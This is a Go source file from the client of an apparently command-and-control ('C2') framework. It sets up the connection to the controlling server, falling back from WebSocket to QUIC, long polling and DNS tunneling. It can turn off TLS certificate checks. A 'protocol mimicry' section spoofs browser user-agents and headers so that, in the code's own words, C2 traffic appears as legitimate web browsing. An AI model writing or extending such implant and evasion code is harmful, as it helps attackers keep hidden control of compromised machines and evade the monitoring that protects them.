package core

import (
	"Rocket/client/common"
	"Rocket/client/config"
	"Rocket/client/telemetry"
	"Rocket/client/transport"
	"context"
	"fmt"
	"time"

	"github.com/kataras/golog"
)

// connectWithFallback attempts to connect using transport fallback mechanism
// Priority: WS → WSS → QUIC → Long Polling → DNS
func connectWithFallback(ctx context.Context) (*common.Conn, error) {
	// Build transport configuration from client config
	dnsServer := config.Config.DNSServer
	if dnsServer == "" {
		dnsServer = "8.8.8.8:53" // Default to Google DNS
	}

	quicPort := config.Config.QUICPort
	if quicPort == 0 {
		quicPort = 443 // Default QUIC port
	}

		cfg := &transport.Config{
		// Use HTTP(S) base URL; WebSocket transport will convert schemes.
		ServerURL:  config.GetBaseURL(false),
		UUID:       config.Config.UUID,
		Key:        config.Config.Key,

		// Timeouts
		ConnectTimeout:  10 * time.Second,
		ReadTimeout:     90 * time.Second,
		WriteTimeout:    10 * time.Second,

		// TLS settings
		InsecureSkipVerify: config.Config.InsecureSkipVerify,

		// DNS tunneling config
		DNSServer: dnsServer,
		DNSDomain: config.Config.DNSDomain,

		// Long polling config
		LongPollTimeout: 30 * time.Second,
		LongPollPath:    "/api/longpoll",

		// QUIC config
		QUICEnabled: config.Config.EnableQUIC,
		QUICPort:    quicPort,

		// Protocol mimicry (makes C2 traffic appear as legitimate web browsing)
		Mimicry: &transport.ProtocolMimicryConfig{
			Enabled: config.Config.EnableMimicry,
			UserAgents: []string{
				"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
				"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
				"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
				"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
			},
			Headers: map[string]string{
				"Accept-Language": "en-US,en;q=0.9",
				"Accept-Encoding": "gzip, deflate, br",
			},
			Protocol: "h2", // HTTP/2
		},
	}

	// Create transport manager
	manager := transport.NewManager(cfg)
	defer func() {
		// Don't close manager here since connection might be using it
	}()

	// Attempt connection with fallback
	conn, usedTransport, err := manager.Connect(ctx)
	if err != nil {
		telemetry.LogWSError("all transports failed", err, nil)
		return nil, fmt.Errorf("all transports failed: %w", err)
	}

	// Log successful transport
	telemetry.LogWSEvent("connected via transport", map[string]interface{}{
		"transport": usedTransport.Name(),
		"priority":  usedTransport.Priority(),
	})

	golog.Infof("core: Connected successfully using %s transport", usedTransport.Name())

	return conn, nil
}

// connectWithAutoFallback automatically chooses between new and legacy connection methods
// Uses individual transport flags to determine behavior
func connectWithAutoFallback(ctx context.Context) (*common.Conn, error) {
	// Check if any fallback transports are enabled
	hasFallback := config.Config.EnableQUIC || config.Config.EnableLongPoll || config.Config.EnableDNS
	if hasFallback {
		return connectWithFallback(ctx)
	}
	// Legacy WebSocket-only connection
	return connectWS()
}
